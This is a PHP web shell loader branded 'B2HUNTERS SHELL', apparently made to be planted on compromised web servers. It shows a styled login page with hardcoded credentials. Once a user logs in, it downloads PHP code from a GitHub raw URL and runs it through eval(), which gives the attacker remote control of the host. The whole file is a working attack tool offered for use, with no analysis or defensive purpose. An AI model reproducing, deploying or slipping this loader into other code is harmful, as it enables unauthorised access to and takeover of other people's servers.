<?php
session_start();

// Encode username and password using MD5
$correct_username_md5 = md5('tan');
$correct_password_md5 = md5('tan');

// Function to display login form - B2HUNTERS LITE EDITION
function display_login_form($error = '') {
  echo '<!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>B2HUNTERS SHELL</title>
          <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body {
              background: #0a0e14;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              font-family: "Courier New", monospace;
            }
            .login-box {
              background: #111a22;
              padding: 35px 30px 25px;
              border-radius: 12px;
              border: 1px solid #1a2a3a;
              width: 320px;
              text-align: center;
              box-shadow: 0 0 40px rgba(0,229,176,0.06);
            }
            .login-box img {
              width: 90px;
              margin-bottom: 6px;
              border-radius: 50%;
              border: 2px solid #00e5b044;
              padding: 3px;
            }
            .login-box h1 {
              color: #00e5b0;
              font-size: 20px;
              letter-spacing: 4px;
              font-weight: 700;
              text-shadow: 0 0 20px rgba(0,229,176,0.15);
            }
            .login-box .sub {
              color: #4a6a7a;
              font-size: 10px;
              letter-spacing: 3px;
              margin: 2px 0 18px 0;
              border-bottom: 1px solid #1a2a3a;
              padding-bottom: 12px;
            }
            .login-box .sub span { color: #00e5b0; }
            .login-box input[type="text"],
            .login-box input[type="password"] {
              width: 100%;
              padding: 11px 14px;
              margin: 6px 0;
              background: #0d151e;
              border: 1px solid #1a2a3a;
              border-radius: 8px;
              color: #b0d0e0;
              font-size: 13px;
              font-family: "Courier New", monospace;
              outline: none;
              transition: 0.2s;
            }
            .login-box input:focus {
              border-color: #00e5b0;
              box-shadow: 0 0 12px rgba(0,229,176,0.08);
            }
            .login-box input[type="submit"] {
              width: 100%;
              padding: 11px;
              margin-top: 14px;
              background: #00b894;
              border: none;
              border-radius: 8px;
              font-weight: 700;
              font-size: 13px;
              font-family: "Courier New", monospace;
              color: #0a0e14;
              cursor: pointer;
              transition: 0.2s;
              letter-spacing: 2px;
              text-transform: uppercase;
            }
            .login-box input[type="submit"]:hover {
              background: #00e5b0;
              box-shadow: 0 0 25px rgba(0,229,176,0.2);
            }
            .error {
              color: #ff5a6e;
              font-size: 12px;
              margin: 8px 0 4px;
            }
            .footer {
              margin-top: 16px;
              display: flex;
              justify-content: space-between;
              border-top: 1px solid #1a2a3a;
              padding-top: 12px;
              font-size: 10px;
              color: #3a5a6a;
              letter-spacing: 1px;
            }
            .footer .author { color: #00e5b0; font-weight: 700; }
            .footer .ver { color: #2a4a5a; }
          </style>
        </head>
        <body>
          <div class="login-box">
            <img src="https://i.ibb.co.com/9Hr2FR0s/b2hunters-bg.png" alt="B2H">
            <h1>B2HUNTERS</h1>
            <div class="sub">// <span>root</span> access //</div>';
  if ($error) echo "<div class='error'>⛔ $error</div>";
  echo '  <form method="POST">
              <input type="text" name="username" placeholder="username" required>
              <input type="password" name="password" placeholder="password" required>
              <input type="submit" value=">> enter <<">
            </form>
            <div class="footer">
              <span class="author">@ghostlyroot</span>
              <span class="ver">v3.0</span>
            </div>
          </div>
        </body>
        </html>';
}

if (!isset($_SESSION['authenticated'])) {
  if (isset($_POST['username']) && isset($_POST['password'])) {
    if (md5($_POST['username']) === $correct_username_md5 && md5($_POST['password']) === $correct_password_md5) {
      $_SESSION['authenticated'] = true;
      header("Location: " . $_SERVER['REQUEST_URI']);
      exit;
    } else {
      display_login_form("Incorrect username or password.");
      exit;
    }
  } else {
    display_login_form();
    exit;
  }
}

$remote_file = file_get_contents('https://raw.githubusercontent.com/GhostlyrootB2H/Shell-Private/refs/heads/main/ghostlyroot.php');
eval('?>' . $remote_file);
?>